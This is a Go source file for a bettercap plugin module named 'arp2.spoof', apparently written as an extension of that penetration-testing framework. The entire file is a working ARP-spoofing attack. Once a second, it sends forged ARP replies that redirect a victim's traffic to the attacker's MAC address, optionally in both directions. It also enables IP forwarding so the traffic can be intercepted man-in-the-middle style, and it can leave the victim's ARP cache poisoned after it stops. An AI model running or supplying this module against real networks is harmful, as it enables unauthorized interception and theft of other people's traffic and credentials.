package arp2_spoof

import (
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"
)

type ArpReplyer struct {
	session.SessionModule
	aliasMac      net.HardwareAddr
	spoofAddress  net.IP
	spoofMac      net.HardwareAddr
	victimMac     net.HardwareAddr
	victimAddress net.IP
	fullDuplex    bool
	skipRestore   bool
	waitGroup     *sync.WaitGroup
}

func NewArpReplyer(s *session.Session) *ArpReplyer {
	mod := &ArpReplyer{
		SessionModule: session.NewSessionModule("arp2.spoof", s),
		aliasMac:      nil,
		spoofAddress:  nil,
		spoofMac:      nil,
		victimMac:     nil,
		victimAddress: nil,

		fullDuplex:  false,
		skipRestore: false,
		waitGroup:   &sync.WaitGroup{},
	}
	//mod.Error("Session.Interface", mod.Session.Interface)

	//mod.SessionModule.Requires("net.recon")

	//
	// Define Parameters
	//

	mod.AddParam(session.NewStringParameter("arp2.spoof.vict_mac", session.ParamGatewayMac, "", "Victim MAC address"))
	mod.AddParam(session.NewStringParameter("arp2.spoof.vict_addr", session.ParamGatewayAddress, "", "Victim IP address"))
	mod.AddParam(session.NewStringParameter("arp2.spoof.alias_mac", session.ParamIfaceMac, "", "Tells the victim to redirect the network traffic of alias IP  to this MAC address"))
	mod.AddParam(session.NewStringParameter("arp2.spoof.spoof_addr", session.ParamIfaceAddress, "", "IP address that you want to spoof"))

	mod.AddParam(session.NewBoolParameter("arp2.spoof.fullduplex",
		"false",
		""))

	noRestore := session.NewBoolParameter("arp2.spoof.skip_restore",
		"false",
		"If set to true, targets arp2 cache won't be restored when spoofing is stopped.")

	mod.AddObservableParam(noRestore, func(v string) {
		if strings.ToLower(v) == "true" || v == "1" {
			mod.skipRestore = true
			mod.Warning("arp2 cache restoration after spoofing disabled")
		} else {
			mod.skipRestore = false
			mod.Debug("arp2 cache restoration after spoofing enabled")
		}
	})

	//
	// HANDLERS
	//

	mod.AddHandler(session.NewModuleHandler("arp2.spoof on", "",
		"Start ARP2 spoofer.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("arp2.spoof off", "",
		"Stop ARP2 spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	//
	// END
	//

	return mod
}

func (mod ArpReplyer) Name() string {
	return "arp2.spoof"
}

func (mod ArpReplyer) Description() string {
	return "Send ARP2 replyes to a target victim. Victim MAC and IP must be specified."
}

func (mod ArpReplyer) Author() string {
	return "Francesco Pasquali pasquali.public@gmail.com"
}

func (mod *ArpReplyer) Configure() error {
	//var err error

	mod.aliasMac = mod.Session.Interface.HW
	mod.spoofAddress = mod.Session.Interface.IP
	mod.victimMac = mod.Session.Gateway.HW
	mod.victimAddress = mod.Session.Gateway.IP

	if err, tmp_bool := mod.BoolParam("arp2.spoof.fullduplex"); err != nil {
		return err
	} else if mod.fullDuplex = tmp_bool; false { // imposta campo e procedi
	} else if err, tmp_ip := mod.IPParam("arp2.spoof.vict_addr"); err != nil {
		return err
	} else if mod.victimAddress = tmp_ip; false {
	} else if err, tmp_ip := mod.IPParam("arp2.spoof.spoof_addr"); err != nil {
		return err
	} else if mod.spoofAddress = tmp_ip; false {
	} else if err, tmp_mac := mod.MACParam("arp2.spoof.vict_mac"); err != nil {
		return err
	} else if mod.victimMac = tmp_mac; false {
	} else if err, tmp_mac := mod.MACParam("arp2.spoof.alias_mac"); err != nil {
		return err
	} else if mod.aliasMac = tmp_mac; false {
	}

	if mod.fullDuplex {
		mod.Info("Full-duplex mode enabled, looking for %v MAC address", mod.spoofAddress)
		mac, err := mod.Session.FindMAC(mod.spoofAddress, false)

		if err != nil {
			mod.Error("could not find spoofed mac addres, full-duplex mode disabled")
			mod.fullDuplex = false
		} else {
			mod.spoofMac = mac
		}
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *ArpReplyer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, mod.spoof)
}

func (mod *ArpReplyer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.Info("waiting for ARP2 replyier to stop ...")
		mod.unSpoof()
		mod.waitGroup.Wait()
	})
}

func (mod *ArpReplyer) spoof() {

	mod.Info("arp2 replyer started")

	//if mod.fullDuplex {
	//	mod.Warning("full duplex replying is still not supported")
	//}

	mod.waitGroup.Add(1)
	defer mod.waitGroup.Done()

	for ; mod.Running(); time.Sleep(1 * time.Second) {
		sIp := mod.spoofAddress
		sMac := mod.spoofMac
		aMac := mod.aliasMac
		vIp := mod.victimAddress
		vMac := mod.victimMac

		// Invia pacchetto ARP alla vittima spoofandosi come `spoof_addr`
		if err, pkt := packets.NewARPReply(sIp, aMac, vIp, vMac); err != nil {
			mod.Error("error while creating ARP2 spoof packet for %s: %s", vIp, err)
		} else {
			mod.Debug("sending %d bytes of ARP2 packet to %s:%s.", len(pkt), vIp, vMac)
			mod.Session.Queue.Send(pkt)
		}

		if !mod.fullDuplex {
			continue
		}

		if err, pkt := packets.NewARPReply(vIp, aMac, sIp, sMac); err != nil {
			mod.Error("error while creating ARP2 spoof packet for %s: %s", vIp, err)
		} else {
			mod.Debug("sending %d bytes of ARP2 packet to %s:%s.", len(pkt), vIp, vMac)
			mod.Session.Queue.Send(pkt)
		}
	}
}

func (mod *ArpReplyer) unSpoof() error {

	if mod.skipRestore {
		mod.Warning("arp2 cache restoration is disabled")
		return nil
	}

	var err error
	sIp := mod.spoofAddress
	sMac := mod.spoofMac
	vIp := mod.victimAddress
	vMac := mod.victimMac

	if sMac == nil {
		if sMac, err = mod.Session.FindMAC(sIp, false); err != nil {
			mod.Warning("Could not find mac address for %s, skipping cache restore.", sIp)
			return err
		}
	}

	if err, pkt := packets.NewARPReply(sIp, sMac, vIp, vMac); err != nil {
		mod.Error("error while creating ARP2 spoof packet for %s: %s", vIp, err)
	} else {
		mod.Debug("sending %d bytes of ARP2 packet to %s:%s.", len(pkt), vIp, vMac)
		mod.Session.Queue.Send(pkt)
	}

	if mod.fullDuplex {
		if err, pkt := packets.NewARPReply(vIp, vMac, sIp, sMac); err != nil {
			mod.Error("error while creating ARP2 spoof packet for %s: %s", vIp, err)
		} else {
			mod.Debug("sending %d bytes of ARP2 packet to %s:%s.", len(pkt), vIp, vMac)
			mod.Session.Queue.Send(pkt)
		}
	}

	return nil
}